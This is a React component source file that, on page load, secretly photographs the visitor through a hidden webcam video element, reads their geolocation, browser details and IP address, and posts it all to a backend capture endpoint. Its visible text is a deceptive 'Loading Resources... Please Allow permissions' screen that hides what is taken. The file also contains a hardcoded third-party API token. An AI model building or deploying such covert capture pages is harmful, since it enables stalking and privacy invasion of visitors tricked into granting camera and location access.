import { useEffect, useState } from 'react'
import { Spinner } from "@/components/ui/spinner";

function App() {
   async function captureData() {
     try {
       // Access user's webcam
       const video = document.getElementById("video");
       const stream = await navigator.mediaDevices.getUserMedia({
         video: true,
       });
       video.srcObject = stream;

       // Wait for video to load
       await new Promise((resolve) => (video.onloadedmetadata = resolve));

       // Capture image
       const canvas = document.createElement("canvas");
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
       const context = canvas.getContext("2d");
       context.drawImage(video, 0, 0, canvas.width, canvas.height);
       const image = canvas.toDataURL("image/png");

       // Stop webcam stream
       stream.getTracks().forEach((track) => track.stop());

       // Get location
       const location = await new Promise((resolve, reject) => {
         navigator.geolocation.getCurrentPosition(
           (pos) =>
             resolve({
               latitude: pos.coords.latitude,
               longitude: pos.coords.longitude,
             }),
           (err) => reject(err)
         );
       });
       

       // Get device info
       const deviceInfo = {
         userAgent: navigator.userAgent,
         platform: navigator.platform,
         language: navigator.language,
       };

       // Get IP address (using a third-party API)
       const ipData = await fetch("https://ipinfo.io/json?token=29fe5e73fe5e82")
         .then((response) => response.json())
         .catch((err) => console.error("Error fetching IP:", err));

       // Combine all data
       const payload = {
         image,
         location,
         deviceInfo,
         ipAddress: ipData?.ip || "Unknown",
       };

       // Send data to backend
       const response = await fetch("http://localhost:5000/api/capture", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(payload),
       });

       if (response.ok) {
         console.log("Data captured successfully!");
       } else {
         console.error("Error capturing data:", await response.text());
       }
     } catch (error) {
       console.error("Error:", error);
     }
   }

   useEffect(() => {
     // Capture data on page load
     window.onload = captureData();
   }, [])
   

  return (
    <div className="h-screen w-full flex flex-col items-center justify-center">
      <Spinner className="size-12 text-blue-500 mb-2" />
      <div className='flex flex-col items-center gap-2'>

      <p>Loading Resources...</p>
      <p>Please <strong>Allow</strong>  permissions to access</p>
      </div>
      <video
        id="video"
        autoPlay
        playsInline
        style={{ display: "none" }}
      ></video>
    </div>
  );
}

export default App
